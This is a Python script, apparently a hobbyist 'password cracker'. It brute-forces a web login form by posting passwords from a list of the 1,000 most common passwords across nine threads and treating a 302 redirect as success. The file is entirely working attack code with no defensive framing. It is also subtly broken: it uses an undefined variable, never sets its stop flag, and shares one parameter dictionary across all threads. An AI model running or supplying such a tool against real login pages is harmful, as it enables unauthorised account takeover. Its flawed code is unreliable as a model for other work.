from http.client import HTTPResponse
import sys
import requests
import re
import json
import ast
import threading
pwfoundflag = 0

def main():
    argcounter = 0
    params = {}
    cookies = {}
    for argcounter in range(1,len(sys.argv)):
        argtag = sys.argv[argcounter]
        print(argtag)
        if argtag == "-h":
            print("Welcome to Sneeblys Password Cracker")
            print("-c <name:value>  Cookies")
            print("-p <name:value>  Post Parameters")
            print("-u <url>  URL")
            print("-passfield <name>  name of field that needs to be cracked")
            break
        try:
            arg = sys.argv[argcounter+1]
        except:
            break
        if argtag == "-u":
            url = arg
        if argtag == "-p":
            x = arg.split(":")
            params[x[0]] = x[1]
        if argtag == "-c":
            x = arg.split(":")
            cookies[x[0]] = x[1]
        if argtag == "-passfield":
            passwordfield = arg

    t1 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":1,"pwf":passwordfield})
    t2 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":2,"pwf":passwordfield})
    t3 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":3,"pwf":passwordfield})
    t4 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":4,"pwf":passwordfield})
    t5 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":5,"pwf":passwordfield})
    t6 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":6,"pwf":passwordfield})
    t7 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":7,"pwf":passwordfield})
    t8 = threading.Thread(target=bruteforce, args=(url,),kwargs={"cookies":cookies,"parameters":params,"index":8,"pwf":passwordfield})
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
    bruteforce(url,cookies,params,0,passwordfield)


def searchformiddleware(input):
        x = input.text
        inputtag = re.search(r"<input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"[^\"]*\">",x)
        valuelist = re.findall(r"\"[^\"]*\"",inputtag.group())
        mwt = valuelist[2]
        mwt =mwt.strip('\"')
        return mwt


def getcookie(req):
    csrftoken = req.cookies.get("csrftoken")


def bruteforce(url,cookies,parameters,index,pwf):
    global pwfoundflag
    filez = open("1000-most-common-passwords.txt","r")
    passworddict =filez.readlines()
    while (index < len(passworddict)):
        password = passworddict[index].strip()
        headers = {'Content-type': 'application/x-www-form-urlencoded'}
        parameters[pwf]=password
        print(parameters)
        submitform = requests.post(headers=headers,url=url,cookies=cookies,data=parameters)
        index = index + 9
        if pwfoundflag !=0:
            break
        print("Trying Password: "+ password)
        if submitform.status_code == 302:
            print("SUCCESSSSSSSSSSSSSSSSSSSSSSS")
            print("Password is    " + password)
            break
    if  len(passworddict)<counter:
        print("password not found")

main()
